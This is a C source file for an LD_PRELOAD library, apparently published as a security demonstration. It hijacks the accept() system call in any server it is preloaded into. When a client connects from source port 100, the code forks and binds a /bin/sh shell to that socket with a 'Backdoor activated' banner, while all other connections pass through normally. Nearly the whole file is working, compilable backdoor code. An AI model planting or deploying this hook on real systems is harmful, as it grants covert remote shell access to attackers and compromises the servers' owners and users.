/***********************************************************************
*
* Project: accept_backdoor.so
*
* Author: Travis Phillips
*
* Date: 05/18/2022
*
* Project Repo:
*  https://github.com/ProfessionallyEvil/LD_PRELOAD-accept-backdoor
*
* Purpose: This code show how to use LD_PRELOAD to create an accept()
*          backdoor. This backdoor will hijack the accept() call and
*          if the source port from the client came from TCP port 100,
*          spawn a shell and return -1 to the client, otherwise it will
*          return the client sock_fd like normal.
*
* Compile: gcc -FPIC -shared accept_backdoor.c -o accept_backdoor.so -ldl
*
***********************************************************************/
#define _GNU_SOURCE       // Needed for RTLD_NEXT
#include <stdio.h>        // Standard include
#include <sys/types.h>    // Socket Stuff
#include <sys/socket.h>   // Socket Stuff
#include <netinet/in.h>   // Socket Stuff
#include <netdb.h>        // Socket Stuff
#include <arpa/inet.h>    // Socket Stuff
#include <unistd.h>       // for dup2(), execve(), fork()
#include <string.h>       // strlen()
#include <dlfcn.h>        // dlsym

/////////////////////////////////
// Constants
/////////////////////////////////
#define BANNER "\033[31;1m" \
               "       _____ ______________  ______  ______\n" \
               "      / ___// ____/ ____/ / / / __ \\/ ____/\n" \
               "      \\__ \\/ __/ / /   / / / / /_/ / __/   \n" \
               "     ___/ / /___/ /___/ /_/ / _, _/ /___   \n" \
               "    /____/_____/\\____/\\____/_/ |_/_____/   \n" \
               "                                           \n" \
               "        ________  _________   _____        \n" \
               "       /  _/ __ \\/ ____/   | / ___/        \n" \
               "       / // / / / __/ / /| | \\__ \\         \n" \
               "     _/ // /_/ / /___/ ___ |___/ /         \n" \
               "    /___/_____/_____/_/  |_/____/          \n" \
               "\033[0m\n" \
               " [\033[32;1m+\033[0m] \033[32;1mBackdoor activated! Enjoy!\n" \
               "\033[0m\n"

// This is the the backdoor trigger.  If the source port
// came from this port, then the backdoor will trigger.
// Using a low number privilege ports will likely avoid
// accidental triggers
static const unsigned short BACKDOOR_SRC_PORT = 100;

#ifdef NOCOLOR
    static const char RED[]= "";
    static const char GREEN[]= "";
    static const char BLUE[]= "";
    static const char NC[]= "";
#else
    static const char RED[]= "\033[31;1m";
    static const char GREEN[]= "\033[32;1m";
    static const char BLUE[]= "\033[34;1m";
    static const char NC[]= "\033[0m";
#endif

// Function pointer to store the real accept() function address.
static int (*real_accept)(int, struct sockaddr *, socklen_t *) = NULL;

/////////////////////////////////////////////////////////
// Use a constructor to run at load time to look up the
// real address for accept().  This enables use to use
// the real accept() function from our hijacked function.
/////////////////////////////////////////////////////////
void __attribute__((constructor)) backdoor_initalize() {
  real_accept = dlsym(RTLD_NEXT, "accept");
  #ifdef DEBUG
  printf(" [%s+%s] %sBACKDOOR: accept() Backdoor Loaded!\n%s",
         GREEN, NC, GREEN, NC);
  printf(" [%s+%s] %sBACKDOOR: Real accept() addr: %s%p%s\n",
         GREEN, NC, GREEN, BLUE, real_accept, NC);
  #endif

}

/////////////////////////////////////////////////////////
// A function that will turn the socket into a dup_2 shell
/////////////////////////////////////////////////////////
void launch_backdoor(int client_sock_fd) {
    // Print a banner for the backdoor user.
    write(client_sock_fd, BANNER, strlen(BANNER));
    
    // Dup STDIN, STDOUT, STDERR to the client socket.
    dup2(client_sock_fd, 0);
    dup2(client_sock_fd, 1);
    dup2(client_sock_fd, 2);
    
    // Use execve to start a shell.
    execve("/bin/sh", 0, 0);
}

/////////////////////////////////////////////////////////
// Our hijacked accept function applications with our
// LD_PRELOAD library will use.
/////////////////////////////////////////////////////////
int accept(int sockfd, struct sockaddr *addr , socklen_t *addrLen) {
  int client_sock_fd = 0;
  struct sockaddr_in *addr_in = NULL;
  
  #ifdef DEBUG
  printf(" [%s+%s] %sBACKDOOR: Running real accept()%s\n", GREEN, NC, GREEN, NC);
  #endif

  // Use the real accept function to get a client connection.
  client_sock_fd = real_accept(sockfd, (struct sockaddr *) addr, addrLen);
  
  // get a sockaddr_in pointer to the sockaddr struct so we can get the
  // IP address and source port information more easily.
  addr_in = (struct sockaddr_in *)addr;

  #ifdef DEBUG
  printf(" [%s+%s] %sBACKDOOR: Got connection from: %s%s:%u%s\n",
         GREEN, NC, GREEN, BLUE,
         inet_ntoa(addr_in->sin_addr),
         ntohs(addr_in->sin_port), NC);
  #endif
  
  // Check if the source port of the connection was from our backdoor
  // port number, if so we will turn this socket into a shell.
  if (ntohs(addr_in->sin_port) == BACKDOOR_SRC_PORT) {
      #ifdef DEBUG
        printf(" [%s+%s] %sBACKDOOR: Source port is backdoor trigger!%s\n",
               GREEN, NC, GREEN, NC);
        printf(" [%s+%s] %sBACKDOOR: Launching Backdoor!%s\n",
               GREEN, NC, GREEN, NC);
      #endif
      // Fork the process.
      if (fork() == 0) {
        // In the child process, launch the backdoor.
        launch_backdoor(client_sock_fd);
      } else {
        // In the parent, close the client socket and return -1 (error)
        close(client_sock_fd);
        return -1;
      }
  }

  // If not, do not activate the backdoor, instead we will just return
  // the client sock back to the application like it expects.
  #ifdef DEBUG
    printf(" [-] %sBACKDOOR: Source port is not the backdoor trigger.%s\n",
           RED, NC);
  #endif
  return client_sock_fd;
  
}
